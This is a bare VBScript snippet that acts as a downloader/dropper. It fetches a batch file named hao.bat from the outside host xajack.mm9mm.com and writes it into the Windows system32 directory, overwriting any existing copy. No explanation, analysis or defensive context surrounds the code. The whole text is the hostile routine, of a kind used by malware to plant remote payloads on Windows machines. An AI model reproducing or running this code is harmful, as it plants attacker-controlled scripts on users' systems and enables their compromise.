Set xPost = CreateObject("Microsoft.XMLHTTP")  
xPost.Open "GET","Http://xajack.mm9mm.com/hao.bat",0  
xPost.Send()  
Set sGet = CreateObject("ADODB.Stream")  
sGet.Mode = 3  
sGet.Type = 1  
sGet.Open()  
sGet.Write(xPost.responseBody)  
sGet.SaveToFile "C:\WINNT\system32\hao.bat",2 
